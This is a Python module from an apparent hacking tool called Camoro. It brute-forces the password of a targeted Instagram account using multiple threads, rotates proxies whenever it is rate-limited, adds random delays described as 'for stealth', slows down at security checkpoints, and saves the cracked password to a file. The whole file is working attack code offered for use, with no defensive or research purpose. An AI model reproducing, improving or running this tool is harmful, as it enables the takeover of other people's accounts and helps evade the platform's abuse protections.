#!/usr/bin/env python3
"""
Camoro Brute Force Attack Module
Manages the password testing process with smart rate limiting and proxy rotation.
"""

import os
import time
import json
import random
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed

from .session_manager import InstagramSession
from .proxy_rotator import ProxyRotator
from .config import (
    OUTPUT_DIR, MIN_DELAY, MAX_DELAY, 
    MAX_ATTEMPTS_PER_IP, COOLDOWN_PERIOD
)

class BruteAttacker:
    """Manages password brute-force attempts with anti-detection."""
    
    def __init__(self, username, passwords, proxy_rotator=None):
        self.username = username
        self.passwords = passwords
        self.total_passwords = len(passwords)
        self.proxy_rotator = proxy_rotator or ProxyRotator()
        
        self.attempted = 0
        self.found = False
        self.correct_password = None
        self.lock = threading.Lock()
        self.stop_flag = threading.Event()
        
        self.results_file = os.path.join(OUTPUT_DIR, f"{username}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json")
        
        # Statistics
        self.stats = {
            "start_time": datetime.now().isoformat(),
            "attempts": 0,
            "rate_limited": 0,
            "network_errors": 0,
            "checkpoints": 0,
            "proxy_rotations": 0,
            "found_password": None,
        }
    
    def start_attack(self, threads=3, callback=None):
        """
        Start the brute-force attack.
        
        Args:
            threads: Number of concurrent threads (keep low for stealth)
            callback: Optional progress callback function
        """
        print(f"\n{R}[!] Starting Brute Force Attack{R}")
        print(f"{Y}[*] Target: @{self.username}{R}")
        print(f"{Y}[*] Passwords to test: {self.total_passwords:,}{R}")
        print(f"{Y}[*] Threads: {threads}{R}")
        print(f"{Y}[*] Strategy: Smart rotation with random delays{R}")
        print(f"{R}{'='*60}{R}\n")
        
        # Split passwords into chunks for threads
        chunk_size = max(1, self.total_passwords // threads)
        chunks = []
        for i in range(threads):
            start = i * chunk_size
            end = start + chunk_size if i < threads - 1 else self.total_passwords
            chunks.append(self.passwords[start:end])
        
        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = []
            for i, chunk in enumerate(chunks):
                future = executor.submit(self._attack_worker, chunk, i, callback)
                futures.append(future)
            
            for future in as_completed(futures):
                if self.found:
                    self.stop_flag.set()
                    break
        
        self._save_results()
        
        if self.found:
            print(f"\n{G}{'='*60}{R}")
            print(f"{G}[✓] PASSWORD FOUND!{R}")
            print(f"{G}[✓] Username: {self.username}{R}")
            print(f"{G}[✓] Password: {self.correct_password}{R}")
            print(f"{G}[✓] Results saved to: {self.results_file}{R}")
            print(f"{G}{'='*60}{R}\n")
        else:
            print(f"\n{Y}[!] Password not found in generated list{R}")
            print(f"{Y}[!] Consider adding more personal information{R}")
        
        return self.correct_password
    
    def _attack_worker(self, password_chunk, worker_id, callback=None):
        """Worker thread for password testing."""
        session = None
        proxy = None
        local_attempts = 0
        
        for i, password in enumerate(password_chunk):
            if self.stop_flag.is_set():
                break
            
            with self.lock:
                self.attempted += 1
                self.stats["attempts"] += 1
                current_attempt = self.attempted
            
            # Rotate proxy if needed
            if local_attempts >= MAX_ATTEMPTS_PER_IP or not session:
                proxy = self.proxy_rotator.get_next_proxy()
                
                if session:
                    session.reset_session()
                session = InstagramSession(proxy=proxy)
                
                local_attempts = 0
                
                with self.lock:
                    self.stats["proxy_rotations"] += 1
            
            # Attempt login
            success, response = session.attempt_login(self.username, password)
            local_attempts += 1
            self.proxy_rotator.report_attempt()
            
            if success:
                with self.lock:
                    self.found = True
                    self.correct_password = password
                    self.stats["found_password"] = password
                self.stop_flag.set()
                return
            
            # Handle response
            error_type = response.get("error", "unknown")
            
            if error_type == "rate_limited":
                with self.lock:
                    self.stats["rate_limited"] += 1
                self.proxy_rotator.mark_blocked(proxy)
                local_attempts = MAX_ATTEMPTS_PER_IP  # Force rotation
                time.sleep(COOLDOWN_PERIOD / 4)
            
            elif error_type == "checkpoint_required":
                with self.lock:
                    self.stats["checkpoints"] += 1
                # Don't force rotation for checkpoint, but slow down
                time.sleep(random.uniform(5, 10))
            
            elif error_type == "network_error":
                with self.lock:
                    self.stats["network_errors"] += 1
                time.sleep(random.uniform(3, 6))
            
            # Progress callback
            if callback and current_attempt % 50 == 0:
                callback(current_attempt, self.total_passwords, self.stats)
            
            # Random delay for stealth
            if not self.found:
                delay = self.proxy_rotator.get_random_delay()
                time.sleep(delay)
            
            # Print progress every 100 attempts
            if current_attempt % 100 == 0:
                progress = (current_attempt / self.total_passwords) * 100
                print(f"    [W{worker_id}] Attempt {current_attempt:,}/{self.total_passwords:,} "
                      f"({progress:.1f}%) | Rate limits: {self.stats['rate_limited']} | "
                      f"Rotations: {self.stats['proxy_rotations']}")
        
        if session:
            session.reset_session()
    
    def _save_results(self):
        """Save attack results to JSON file."""
        self.stats["end_time"] = datetime.now().isoformat()
        self.stats["found"] = self.found
        self.stats["correct_password"] = self.correct_password
        self.stats["total_passwords_tested"] = self.total_passwords
        
        with open(self.results_file, 'w') as f:
            json.dump(self.stats, f, indent=2, ensure_ascii=False)
